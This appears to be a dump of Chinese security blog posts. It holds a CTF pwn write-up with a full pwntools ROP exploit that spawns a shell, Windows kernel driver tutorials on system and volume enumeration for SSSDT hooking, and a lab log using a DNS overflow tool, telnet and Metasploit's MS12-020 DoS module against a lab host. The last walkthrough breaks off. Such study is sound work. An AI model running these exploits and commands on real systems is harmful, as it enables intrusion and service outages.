-构造gets(bss);将’&#x2F;bin&#x2F;sh’写入bss段 -构造’system(“&#x2F;bin&#x2F;sh”)’得到shell 使用ROPgadgets寻找gadgets，用于构造ROP链条 ROPgadget –binary .&#x2F;welpwn –only “opo|ret” 找到main函数地址，用作返回地址 objdump -d welpwn | grep main bss段开始地址，用于存储字符串(‘&#x2F;bin&#x2F;sh’) readelf -S welpwn | grep bss puts（plt）地址，用于泄露内存 objdump -d welpwn | grep puts 构造ROP链，泄露内存 123rop = p64(poprdi) + p64(addr) +p64(puts_plt) + p64(main)payload = &quot;A&quot; * 24 + p64(ppppr) +rop 利用pwnlib中DynELF模块泄露libc中system和puts地址 123456789101112131415161718192021222324252627def leak(addr):rop = p64(poprdi) + p64(addr) + p64(puts_plt) + p64(main)payload = &quot;A&quot; * 24 + p64(ppppr) + ropp.sendline(payload)p.recv(27)tmp = p.recv()data = tmp.split(&quot;\\nWelcome&quot;)[0] if len(data):​ return data else:​ return &#x27;\\x00&#x27;d = DynELF(leak, elf=ELF(&#x27;welpwn&#x27;))system = d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;)gets = d.lookup(&#x27;gets&#x27;, &#x27;libc&#x27;) 构造ROP链将’&#x2F;bin&#x2F;sh’写入bss段，并执行system(“&#x2F;bin&#x2F;sh”): 123rop = p64(poprdi) + p64(bss) + p64(gets) +p64(poprdi) + p64(bss) + p64(system) + p64(0xdeadbeef)payload = &quot;A&quot;*24 + p64(ppppr) +rop 运行后如图所示，拿到shell 完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122from pwn import *p = process(&#x27;welpwn&#x27;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)elf = ELF(&#x27;welpwn&#x27;)read_got = elf.symbols[&#x27;got.read&#x27;]log.info(&quot;read_got = &quot; + hex(read_got))write_got = elf.symbols[&#x27;got.write&#x27;]log.info(&quot;write_got = &quot; + hex(write_got))main = elf.symbols[&#x27;main&#x27;]log.info(&quot;main = &quot; + hex(main))buflen = 24mmmcall = 0x400880ppppppr = 0x40089appppr = 0x40089cpadding = 0xdeadbeefflag = 0def leak(address): global flag payload = &quot;&quot; payload += &quot;Q&quot; * buflen payload += p64(ppppr) payload += p64(ppppppr) rbx = 0 rbp = 1 r12 = write_got r13 = 8 r14 = address r15 = 1 ret = mmmcall payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret) ret = main payload += p64(padding) * 7 + p64(ret) p.recvuntil(&#x27;RCTF\\n&#x27;) p.sendline(payload) if flag: p.recv(0x1b) data = p.recv(8) log.info(&quot;recv: &quot; + str(data)) flag += 1 return datad = DynELF(leak, elf=ELF(&#x27;welpwn&#x27;))system = d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;)log.info(&quot;system addr = &quot; + hex(system))bss = 0x601300payload = &quot;&quot;payload += &quot;P&quot; * buflenpayload += p64(ppppr)payload += p64(ppppppr)rbx = 0rbp = 1r12 = read_gotr13 = 17r14 = bssr15 = 0ret = mmmcallpayload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)ret = mainpayload += p64(padding) * 7 + p64(ret)p.recvuntil(&quot;RCTF\\n&quot;)p.sendline(payload)sleep(1)p.sendline(&quot;/bin/sh\\0&quot;+ p64(system))check = &quot;&quot;check += &quot;C&quot; * buflencheck += p64(ppppr)check += p64(ppppppr)rbx = 0rbp = 1r12 = write_gotr13 = 16r14 = bssr15 = 1ret = mmmcallcheck += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)ret = maincheck += p64(padding) * 7 + p64(ret)p.recvuntil(&quot;RCTF\\n&quot;)p.sendline(check)sleep(1)p.recv(0x1b)log.info(&quot;recv:&quot; + p.recv(16).encode(&#x27;hex&#x27;))payload = &quot;&quot;payload += &quot;R&quot; * buflenpayload += p64(ppppr)payload += p64(ppppppr)rbx = 0rbp = 1r12 = bss+0x8r13 = bssr14 = bssr15 = bssret = mmmcallpayload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)ret = mainpayload += p64(padding) * 7 + p64(ret)p.recvuntil(&quot;RCTF\\n&quot;)p.sendline(payload)sleep(0.5)p.recv()p.interactive()","categories":[{"name":"PWN","slug":"PWN","permalink":"https://qianmuoy.github.io/categories/PWN/"}],"tags":[]},{"title":"获取系统信息","slug":"获取系统信息","date":"2024-03-09T12:35:12.000Z","updated":"2024-03-09T12:35:29.634Z","comments":true,"path":"2024/03/09/获取系统信息/","link":"","permalink":"https://qianmuoy.github.io/2024/03/09/%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF/","excerpt":"","text":"获取系统信息DriverEntry1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071typedef NTSTATUS(NTAPI* LPFN_RTLGETVERSION)( OUT PRTL_OSVERSIONINFOW OsVersionInfo);typedef enum&#123; UNKNOWN_VERSION = 0, WIN2000_VERSION, WINXP_VERSION, WIN2003_VERSION, WINVISTA_VERSION, WIN7_VERSION, WIN8_VERSION, WIN8_VERSION_1, WIN8_VERSION_1_9600, WIN10_VERSION, WIN10_VERSION_10240, WIN10_VERSION_10586,&#125;OS_VERSION;enum OS_VERSION __OsVersion = UNKNOWN_VERSION;RTL_OSVERSIONINFOEXW __RtlOsVersionInfo = &#123; 0 &#125;;// wdm.h中定义的，保存系统版本信息的结构体UNICODE_STRING __RtlGetVersionU = RTL_CONSTANT_STRING(L&quot;RtlGetVersion&quot;);//系统导出的全局变量extern PULONG InitSafeBootMode;NTSTATUS DriverEntry( DRIVER_OBJECT* DriverObject, UNICODE_STRING* RegistryPath)&#123; NTSTATUS Status = STATUS_ACCESS_DENIED; /* 1: kd&gt; dd InitSafeBootMode849a4980 00000000 00000000 02080014 ffdf0030 */ if (*InitSafeBootMode &gt; 0) &#123; return STATUS_ACCESS_DENIED; &#125; // 一个全局结构体，代表系统版本信息 __RtlOsVersionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW); __RtlOsVersionInfo.dwMajorVersion = 0xFF; // 初始化一个无效的版本 // 从系统模块ntkrnlpa.exe的导出表中获取函数地址 __RtlGetVersion = (LPFN_RTLGETVERSION)MmGetSystemRoutineAddress(&amp;__RtlGetVersionU); if (__RtlGetVersion) &#123; __RtlGetVersion((PRTL_OSVERSIONINFOW)&amp;__RtlOsVersionInfo); &#125; InitializeOsVersion(); //初始化系统版本信息 if (__OsVersion == UNKNOWN_VERSION) &#123; return STATUS_ACCESS_DENIED; &#125; //Ntos.exe //Win32k.sys //Ntdll.dll //csrss.exe Status = GetSystemInfo(); if (!NT_SUCCESS(Status)) &#123; return Status; &#125; __DriverObject = DriverObject; DriverObject-&gt;DriverUnload = DriverUnload;&#125; 获取系统版本先判断MajorVersion，2003、 xp、 2000都是5，后面的都是6，win10是10。再判断MinorVersion，分辨win7、win8。对于win8、win10的一些小版本，通过BuildNumber来判断。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283ULONG __BuildNumber = 0;void InitializeOsVersion()&#123; ULONG BuildNumber = 0; ULONG MajorVersion = 0; ULONG MinorVersion = 0; PsGetVersion(&amp;MajorVersion, &amp;MinorVersion, &amp;BuildNumber, NULL); __BuildNumber = BuildNumber; // 2003, xp, 2000 if (MajorVersion == 5) &#123; switch (MinorVersion) &#123; case 0: // win2k __OsVersion = WIN2000_VERSION; return; case 1: // winxp __OsVersion = WINXP_VERSION; //ReadOsServicePack(); return; case 2: // win2003 __OsVersion = WIN2003_VERSION; return; &#125; &#125; else if (MajorVersion == 6) &#123; switch (MinorVersion) &#123; case 0: __OsVersion = WINVISTA_VERSION; return; case 1: __OsVersion = WIN7_VERSION; return; case 2: __OsVersion = WIN8_VERSION; return; case 3: if (__BuildNumber == 9431) &#123; __OsVersion = WIN8_VERSION_1; &#125; if (__BuildNumber == 9600) &#123; __OsVersion = WIN8_VERSION_1_9600; &#125; return; case 4: __OsVersion = WIN10_VERSION; return; &#125; &#125; else if (MajorVersion == 10) &#123; if (__BuildNumber &lt; 10240) &#123; __OsVersion = WIN10_VERSION; &#125; else if (__BuildNumber == 10240) &#123; __OsVersion = WIN10_VERSION_10240; &#125; else if (__BuildNumber == 10586) &#123; __OsVersion = WIN10_VERSION_10586; &#125; return; &#125; __OsVersion = UNKNOWN_VERSION;&#125; 获取系统信息 csrss.exe是微软客户端、服务端运行时子系统，管理Windows图形相关任务，Hook SSSDT必须。SSSDT就是win32k.sys里面的函数，大多数都跟图形相关，比如什么NtUserGetDCEx或者NtUserCreateWindowEx等。所以要查看这些内核函数地址，光在驱动中进行和SSDT一样的访问会引发异常蓝屏的。所以有前辈就想出办法，在驱动程序里面调用KeAttachProces到csrss.exe中，获取这个系统进程的地址空间从而在驱动中获取SSSDT中的函数地址 ZwQuerySystemInformation函数需要导出使用。配合枚举类型指示获取系统的什么信息。代码中获取了系统的所有模块，这个函数返回了首地址和大小。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation( ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);typedef enum _SYSTEM_INFORMATION_CLASS &#123; SystemBasicInformation, SystemProcessorInformation, // obsolete...delete SystemPerformanceInformation, SystemTimeOfDayInformation, SystemPathInformation, SystemProcessInformation, SystemCallCountInformation, SystemDeviceInformation, SystemProcessorPerformanceInformation, SystemFlagsInformation, SystemCallTimeInformation, SystemModuleInformation, SystemLocksInformation, SystemStackTraceInformation, SystemPagedPoolInformation, SystemNonPagedPoolInformation, SystemHandleInformation, SystemObjectInformation, SystemPageFileInformation, SystemVdmInstemulInformation, SystemVdmBopInformation, SystemFileCacheInformation, SystemPoolTagInformation, SystemInterruptInformation, SystemDpcBehaviorInformation, SystemFullMemoryInformation, SystemLoadGdiDriverInformation, SystemUnloadGdiDriverInformation, SystemTimeAdjustmentInformation, SystemSummaryMemoryInformation, SystemMirrorMemoryInformation, SystemPerformanceTraceInformation, SystemObsolete0, SystemExceptionInformation, SystemCrashDumpStateInformation, SystemKernelDebuggerInformation, SystemContextSwitchInformation, SystemRegistryQuotaInformation, SystemExtendServiceTableInformation, SystemPrioritySeperation, SystemVerifierAddDriverInformation, SystemVerifierRemoveDriverInformation, SystemProcessorIdleInformation, SystemLegacyDriverInformation, SystemCurrentTimeZoneInformation, SystemLookasideInformation, SystemTimeSlipNotification, SystemSessionCreate, SystemSessionDetach, SystemSessionInformation, SystemRangeStartInformation, SystemVerifierInformation, SystemVerifierThunkExtend, SystemSessionProcessInformation, SystemLoadGdiDriverInSystemSpace, SystemNumaProcessorMap, SystemPrefetcherInformation, SystemExtendedProcessInformation, SystemRecommendedSharedDataAlignment, SystemComPlusPackage, SystemNumaAvailableMemory, SystemProcessorPowerInformation, SystemEmulationBasicInformation, SystemEmulationProcessorInformation, SystemExtendedHandleInformation, SystemLostDelayedWriteInformation, SystemBigPoolInformation, SystemSessionPoolTagInformation, SystemSessionMappedViewInformation, SystemHotpatchInformation, SystemObjectSecurityMode, SystemWatchdogTimerHandler, SystemWatchdogTimerInformation, SystemLogicalProcessorInformation, SystemWow64SharedInformation, SystemRegisterFirmwareTableInformationHandler, SystemFirmwareTableInformation, SystemModuleInformationEx, SystemVerifierTriageInformation, SystemSuperfetchInformation, SystemMemoryListInformation, SystemFileCacheInformationEx, MaxSystemInfoClass // MaxSystemInfoClass should always be the last enum&#125; SYSTEM_INFORMATION_CLASS; strrchr用于从右查找字符数组第一次出现对应标识的地方，并返回指向这个被截断的数组的指针。RtlStringCchCatW连接两个字符串（Unicode），RtlStringCchCatNW限制连接的大小。 win10下，win32k.sys变为了win32kfull.sys 内核有效地址从MmSystemRangeStart开始。模块枚举不到ntdll时，可以使用内存映射的方法获取ntdll信息。 注意比较csrss.exe的最大session id不能大于10。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185NTSTATUS GetSystemInfo()&#123;#define SYSTEM_PROCESS_IDENTITY ((HANDLE)0x4)#define CSRSS_IMAGE_NAME L&quot;csrss.exe&quot; //微软客户端、服务端运行时子系统，管理Windows图形相关任务，Hook Sssdt必须 NTSTATUS Status = STATUS_UNSUCCESSFUL; ULONG ViewSize = 100 * 1024;//100K ULONG NumberOfModules; LONG i; PCHAR ModuleName = NULL; PVOID VirtualAddress = NULL; PRTL_PROCESS_MODULES RtlProcessModules = NULL; PRTL_PROCESS_MODULE_INFORMATION RtlProcessModuleInfo = NULL; PSYSTEM_PROCESS_INFORMATION SystemProcessInfo = NULL; //系统对所有进程的记录结构 LPCSTR v1; ANSI_STRING v2; UNICODE_STRING v3; do &#123; VirtualAddress = AllocateMemory1(ViewSize); if (VirtualAddress == NULL) &#123; return STATUS_NO_MEMORY; &#125; //获取系统所有模块 Status = ZwQuerySystemInformation(SystemModuleInformation, (PVOID)VirtualAddress, ViewSize, NULL); if (Status == STATUS_INFO_LENGTH_MISMATCH) //内存不足 &#123; FreeMemory1(VirtualAddress); VirtualAddress = NULL; ViewSize *= 2; &#125; else if (!NT_SUCCESS(Status)) &#123; FreeMemory1(VirtualAddress); return Status; &#125; &#125; while (Status == STATUS_INFO_LENGTH_MISMATCH); //游历内存 RtlProcessModules = (PRTL_PROCESS_MODULES)VirtualAddress; NumberOfModules = (RtlProcessModules-&gt;NumberOfModules); RtlProcessModuleInfo = (PRTL_PROCESS_MODULE_INFORMATION)(RtlProcessModules-&gt;Modules); //获取到第一个模块信息 v1 = strrchr(RtlProcessModuleInfo-&gt;FullPathName, &#x27;\\\\&#x27;); //右边第一次出现的字符 if (v1) &#123; v1++; RtlInitAnsiString(&amp;v2, v1); //char数组转换成Ansi Status = RtlAnsiStringToUnicodeString(&amp;v3, &amp;v2, TRUE); //Ansi转换成Unicode if (NT_SUCCESS(Status)) &#123; RtlStringCchCatW(__NtosFilePath, sizeof(__NtosFilePath) / sizeof(WCHAR), L&quot;\\\\SystemRoot\\\\system32\\\\&quot;); RtlStringCchCatNW(__NtosFilePath, sizeof(__NtosFilePath) / sizeof(WCHAR), v3.Buffer, v3.Length / sizeof(WCHAR)); RtlFreeUnicodeString(&amp;v3); //TRUE &#125; //v3 struct _UNICODE_STRING &quot;ntkrnlpa.exe&quot; &#125; //ntoskrnl.exe Ntdll.dll Ssdt //获取系统第一个模块信息 ntoskrnl.exe __NtosImageBase = RtlProcessModuleInfo[0].ImageBase; __NtosImageSize = RtlProcessModuleInfo[0].ImageSize; // 枚举系统模块信息 //win32k.sys / WIN32KFULL.SYS User32.dll Sssdt for (i = (LONG)NumberOfModules - 1; i &gt;= 0; i--) &#123; //c:\\windows\\system\\win32k.sys ModuleName = (RtlProcessModuleInfo[i].FullPathName + RtlProcessModuleInfo[i].OffsetToFileName); if (!_stricmp(ModuleName, WIN32K_SYS)) &#123; __Win32kImageBase = RtlProcessModuleInfo[i].ImageBase; //0x87e5a31d &quot;win32k.sys&quot; &#125; if (__OsVersion == WIN10_VERSION_10240) &#123; if (!_stricmp(ModuleName, &quot;win32kfull.sys&quot;)) &#123; __Win32kFullImageBase = RtlProcessModuleInfo[i].ImageBase; &#125; &#125; &#125; //ntdll.dll for (i = (LONG)NumberOfModules - 1; i &gt;= 0; i--) &#123; //判断地址是否在Ring3层的范围内 //0: kd&gt; dd MmSystemRangeStart //849a584c 80000000 7fff0000 80741000 000fffff if ((ULONG_PTR)RtlProcessModuleInfo[i].ImageBase &gt; (ULONG_PTR)MmSystemRangeStart) &#123; continue; &#125; ModuleName = (RtlProcessModuleInfo[i].FullPathName + RtlProcessModuleInfo[i].OffsetToFileName); if (!_stricmp(ModuleName, NTDLL_DLL)) &#123; __NtdllImageBase = RtlProcessModuleInfo[i].ImageBase; __NtdllImageSize = RtlProcessModuleInfo[i].ImageSize; &#125; &#125; if (NULL == __NtdllImageBase) &#123; __NtdllImageBase = MappingModuleInfo(L&quot;\\\\SystemRoot\\\\System32\\\\ntdll.dll&quot;, NULL, NULL); &#125; ///&lt; ntdll if (!__NtosImageBase || !__Win32kImageBase || !__NtdllImageBase) &#123; FreeMemory1(VirtualAddress); return STATUS_NOT_FOUND; &#125; //获取Csrss进程的方法 do &#123; if (NULL == VirtualAddress) &#123; VirtualAddress = AllocateMemory1(ViewSize); if (VirtualAddress == NULL) &#123; return STATUS_NO_MEMORY; &#125; &#125; Status = ZwQuerySystemInformation(SystemProcessInformation, VirtualAddress, ViewSize, NULL); if (Status == STATUS_INFO_LENGTH_MISMATCH) &#123; FreeMemory1(VirtualAddress); VirtualAddress = NULL; ViewSize *= 2; &#125; else if (!NT_SUCCESS(Status)) &#123; FreeMemory1(VirtualAddress); return Status; &#125; &#125; while (Status == STATUS_INFO_LENGTH_MISMATCH); Status = STATUS_NOT_FOUND; SystemProcessInfo = (PSYSTEM_PROCESS_INFORMATION)VirtualAddress; while (TRUE) &#123; if (SystemProcessInfo-&gt;ImageName.Length == sizeof(CSRSS_IMAGE_NAME) - sizeof(WCHAR)) &#123; if (!_wcsnicmp(SystemProcessInfo-&gt;ImageName.Buffer, CSRSS_IMAGE_NAME, (sizeof(CSRSS_IMAGE_NAME) - sizeof(WCHAR)) / sizeof(WCHAR))) &#123; //插入到数据结构中 if (InsertCsrssProcessIdentity(SystemProcessInfo-&gt;UniqueProcessId, SystemProcessInfo-&gt;SessionId)) &#123; Status = STATUS_SUCCESS; &#125; break; &#125; &#125; if (SystemProcessInfo-&gt;NextEntryOffset == 0) &#123; break; //下一个信息如果不存在 &#125; (ULONG_PTR)SystemProcessInfo += SystemProcessInfo-&gt;NextEntryOffset; //定位到下一条信息上 &#125; FreeMemory1(VirtualAddress); return Status;&#125; 使用内存映射方法获取ntdll模块信息123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293PVOID MappingModuleInfo(LPCWSTR FilePath, PULONG ImageFileSize, PULONG ImageSize)&#123;#define SEC_IMAGE 0x1000000 //内存粒度对齐 PVOID ImageBase = NULL; HANDLE FileHandle = NULL; HANDLE SectionHandle = NULL; UNICODE_STRING FilePathU; IO_STATUS_BLOCK IoStatusBlock = &#123; 0 &#125;; NTSTATUS Status; SIZE_T ViewSize = 0; OBJECT_ATTRIBUTES ObjectAttributes = &#123; 0 &#125;; //LARGE_INTEGER SectionOffset; SECTION_IMAGE_INFORMATION SectionImageInfo; RtlInitUnicodeString(&amp;FilePathU, FilePath); //内核句柄 InitializeObjectAttributes(&amp;ObjectAttributes, &amp;FilePathU, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL); //通过文件路径获取文件句柄 Status = ZwOpenFile(&amp;FileHandle, SYNCHRONIZE | GENERIC_READ | FILE_EXECUTE, &amp;ObjectAttributes, &amp;IoStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE); if (!NT_SUCCESS(Status)) &#123; goto Exit; &#125; ObjectAttributes.ObjectName = NULL; //通过文件句柄获取内存映射句柄 Status = ZwCreateSection(&amp;SectionHandle, SECTION_MAP_READ | SECTION_QUERY | SECTION_MAP_EXECUTE, &amp;ObjectAttributes, 0, PAGE_READONLY, SEC_IMAGE, FileHandle); if (!NT_SUCCESS(Status)) &#123; goto Exit; &#125; //获取内存对象中的数据 Status = ZwQuerySection(SectionHandle, SectionImageInformation, &amp;SectionImageInfo, sizeof(SectionImageInfo), NULL ); if (!NT_SUCCESS(Status)) &#123; goto Exit; &#125; if (ImageFileSize) &#123; *ImageFileSize = SectionImageInfo.ImageFileSize; &#125; //通过Section句柄获取虚拟地址 Status = ZwMapViewOfSection( SectionHandle, NtCurrentProcess(), &amp;ImageBase, 0, 0, NULL, &amp;ViewSize, ViewShare, 0, PAGE_READONLY); if (!NT_SUCCESS(Status)) &#123; goto Exit; &#125; if (ImageSize) &#123; *ImageSize = ViewSize; &#125;Exit: if (NULL != FileHandle) &#123; ZwClose(FileHandle); &#125; if (NULL != SectionHandle) &#123; ZwClose(SectionHandle); &#125; return ImageBase;&#125;","categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"}],"tags":[]},{"title":"获取卷信息","slug":"获取卷信息","date":"2024-03-09T12:34:39.000Z","updated":"2024-03-09T12:34:55.431Z","comments":true,"path":"2024/03/09/获取卷信息/","link":"","permalink":"https://qianmuoy.github.io/2024/03/09/%E8%8E%B7%E5%8F%96%E5%8D%B7%E4%BF%A1%E6%81%AF/","excerpt":"","text":"获取卷信息使用内核链表和快速互斥体。 快速互斥体不支持递归获取，也就是不允许自己线程重复获取。 一般互斥体只其他线程，自己线程可以多次取得。 1234567891011FAST_MUTEX __VolumeInfoLock;LIST_ENTRY __VolumeInfoList;void InitializeVolumeInfo()&#123; ExInitializeFastMutex(&amp;__VolumeInfoLock); InitializeListHead(&amp;__VolumeInfoList); EnumVolumeInfo();&#125; 枚举卷信息从A盘开始，将路径转为UnicodeString，再转到OA，调用ZwCreateFile获取卷句柄，调用ZwQueryObject获取对象信息，插入数据结构中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657void EnumVolumeInfo()&#123; WCHAR DosDevice[] = L&quot;\\\\DosDevices\\\\X:&quot;; UNICODE_STRING v1; WCHAR i; OBJECT_ATTRIBUTES ObjectAttributes; HANDLE VolumeHandle; NTSTATUS Status; IO_STATUS_BLOCK IoStatusBlock; OBJECT_NAME_INFORMATION* ObjectNameInfo = NULL; ULONG ObjectNameInfoLength = BUFFER_SIZE_MAX; FreeVolumeInfo(); ObjectNameInfo = (OBJECT_NAME_INFORMATION*)AllocateBufferFromLookAsideList(); // 动态申请内存 if (ObjectNameInfo == NULL) return; for (i = 0; i &lt; 26; i++) &#123; // 从A盘开始遍历 DosDevice[12] = L&#x27;A&#x27; + i; RtlInitUnicodeString(&amp;v1, DosDevice); InitializeObjectAttributes(&amp;ObjectAttributes, &amp;v1, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL); Status = ZwCreateFile( &amp;VolumeHandle, SYNCHRONIZE | FILE_ANY_ACCESS, &amp;ObjectAttributes, &amp;IoStatusBlock, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT | FILE_DIRECTORY_FILE, NULL, 0); if (NT_SUCCESS(Status) == FALSE) continue; ObjectNameInfoLength = BUFFER_SIZE_MAX; Status = ZwQueryObject(VolumeHandle, 1, ObjectNameInfo, ObjectNameInfoLength, &amp;ObjectNameInfoLength); if (NT_SUCCESS(Status) == TRUE) AddVolumeInfo(VolumeHandle, L&#x27;A&#x27; + i, &amp;ObjectNameInfo-&gt;Name); ZwClose(VolumeHandle); &#125; if (ObjectNameInfo != NULL) FreeBufferToLookAsideList(ObjectNameInfo);&#125; 解析卷信息ObReferenceObjectByHandle从句柄到对象，FileObject-&gt;DeviceObject-&gt;Vpb由文件对象获取Vpb，Vpb-&gt;DeviceObject获取Vpb对象，判断是否存在。 动态申请VOLUME_INFO结构，将各种信息放入，插入链表中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051void AddVolumeInfo( HANDLE VolumeHandle, WCHAR VolumeName, UNICODE_STRING* DeviceName)&#123; VOLUME_INFO* v5 = NULL; FILE_OBJECT* FileObject = NULL; PVPB Vpb = NULL; DEVICE_OBJECT* VpbDeviceObject = NULL; ULONG v7 = sizeof(VOLUME_INFO) + (DeviceName-&gt;Length + 1) * sizeof(WCHAR); NTSTATUS Status = ObReferenceObjectByHandle(VolumeHandle, 0, 0, KernelMode, (PVOID*)&amp;FileObject, NULL); if (!NT_SUCCESS(Status)) &#123; return; &#125; if (!FileObject || !FileObject-&gt;DeviceObject || !FileObject-&gt;DeviceObject-&gt;Vpb) &#123; goto Exit; &#125; Vpb = FileObject-&gt;DeviceObject-&gt;Vpb; //卷参数块 (VPB) 结构用于将表示已装载的文件系统卷的设备对象映射到表示物理或虚拟磁盘设备的设备对象 https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_vpb VpbDeviceObject = Vpb-&gt;DeviceObject; if (!VpbDeviceObject) &#123; goto Exit; &#125; v5 = (VOLUME_INFO*)AllocateBuffer(v7); if (v5 == NULL) &#123; goto Exit; &#125; v5-&gt;DeviceObject = FileObject-&gt;DeviceObject; v5-&gt;VpbDeviceObject = VpbDeviceObject; v5-&gt;VolumeName = VolumeName; memcpy(&amp;v5-&gt;DeviceName[0], DeviceName-&gt;Buffer, DeviceName-&gt;Length); v5-&gt;Length = DeviceName-&gt;Length / sizeof(WCHAR); ExAcquireFastMutex(&amp;__VolumeInfoLock); InsertTailList(&amp;__VolumeInfoList, &amp;v5-&gt;ListEntry); ExReleaseFastMutex(&amp;__VolumeInfoLock);Exit: ObDereferenceObject(FileObject); return;&#125; 释放卷信息12345678910111213141516171819202122232425262728VOID FreeVolumeInfo()&#123; VOLUME_INFO* v5 = NULL; LIST_ENTRY* v1 = NULL; ExAcquireFastMutex(&amp;__VolumeInfoLock); if (IsListEmpty(&amp;__VolumeInfoList) == TRUE) goto Exit; while (IsListEmpty(&amp;__VolumeInfoList) == FALSE) &#123; v1 = RemoveHeadList(&amp;__VolumeInfoList); if (v1 == NULL) continue; v5 = CONTAINING_RECORD(v1, VOLUME_INFO, ListEntry); if (v5 == NULL) continue; FreeBuffer(v5); &#125;Exit: InitializeListHead(&amp;__VolumeInfoList); ExReleaseFastMutex(&amp;__VolumeInfoLock);&#125;","categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"}],"tags":[]},{"title":"缓冲区溢出漏洞","slug":"缓冲区溢出漏洞","date":"2024-03-09T12:34:05.000Z","updated":"2024-03-09T12:34:22.384Z","comments":true,"path":"2024/03/09/缓冲区溢出漏洞/","link":"","permalink":"https://qianmuoy.github.io/2024/03/09/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"缓冲区溢出漏洞实战记录脚本背景缓冲区溢出 缓冲区溢出是指当计算机向缓冲区内填充数据时超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上。理想的情况是：程序检查数据长度并不允许输入超过缓冲区长度的字符，但是绝大多数程序都会假设数据长度总是与所分配的储存空间相匹配，这就为缓冲区溢出埋下了隐患。 操作系统所使用的缓冲区，又被称为”堆栈”。在各个操作进程之间，指令会被临时储存在“堆栈”中，“堆栈”也会出现缓冲区溢出。 缓冲区溢出的危害：在当前网络与分布式系统安全中，被广泛利用的50%以上都是缓冲区溢出，其中最著名的例子是1988年利用fingerd漏洞的蠕虫。而缓冲区溢出中，最为危险的是堆栈溢出，因为入侵者可以利用堆栈溢出，在函数返回时改变返回程序的地址，让其跳转到任意地址，带来的危害是：一种情况是程序崩溃导致拒绝服务，另外一种就是跳转并且执行一段恶意代码，比如得到shell，然后为所欲为。 MS12-020漏洞 微软于2012年3月12日发布安全公告，公布了MS12-020漏洞，漏洞级别为严重，这个级别是微软所有漏洞级别的最高级别，意即会对服务和企业运营造成巨大损失。 这个漏洞的定义是指操作系统的远程桌面协议存在重大漏洞，入侵者（黑客）可以通过向远程桌面默认端口（3389）发一系列特定RDP包，从而获取超级管理员权限，进而入侵系统。 若该主机同时提供80端口服务，那么疑似有相对更大的隐患。 根据微软的安全公告，Windows全系列操作系统（WinXP&#x2F;Vista&#x2F;Win7&#x2F;Win2000&#x2F; Win2003&#x2F;Win2008）均存在受控威胁。但因为远程桌面管理的特殊性，几乎所发现的主机都是服务器，PC机暂未发生。 测试程序1234567891011121314151617181920212223/**buffer.c */#include &lt;stdio.h&gt;int main()&#123;char name[8];printf(“Please input your name: ”);gets(name);printf(“your name is : %s!”, name);return 0;&#125; 利用溢出工具溢出目标系统，获取目标系统shellDNS远程溢出的漏洞直接对主机进行溢出攻击，成功后一般会直接获得系统权限。如：Windows DNS API（CVE-2017-11779） 扫描靶机信息 1dns -s ip 找到目标端口1027。选中2003chs进行攻击。 1dns -t 2003chs 10.1.1.2 1027 结果显示1100tcp端口被攻击。现在用telnet远程登陆上去。 1telnet 10.1.1.2 1100 system32目录下，此时已是管理员权限。 利用MS12-020漏洞溢出目标系统，使目标系统瘫痪运行Metasploit，搜集目标主机的目标端口（3389）和其他信息。 1db_nmap -sT -p3389 10.1.1.2 搜索模块 1search ms12_020 显示了位置。接下来进行利用。 12use auxiliary/dos/windows/rdp/ms12_020_maxchannelidsshow options 根据提示设置参数。第二个参数已经被设置。设置好后，使用exploit命令利用。 已瘫痪。无法ping通。 缓冲区溢出调试背景war-ftpd 1.65存在缓冲区溢出漏洞，当登录时用户名过长时就会发生缓冲区溢出，程序进而崩溃。本实验正是利用这一点使用调试工具cdb找出溢出时相应寄存器记录的地址，通过利用shellcode构造用户名字符串，使得war-ftpd程序接收此用户名时发生溢出进而执行shellcode，达到攻击目的。 触发漏洞打开war-ftpd.exe，使用ollydbg attach到这个进程上。没有mona插件，后面都用Immunity Debugger继续调试。 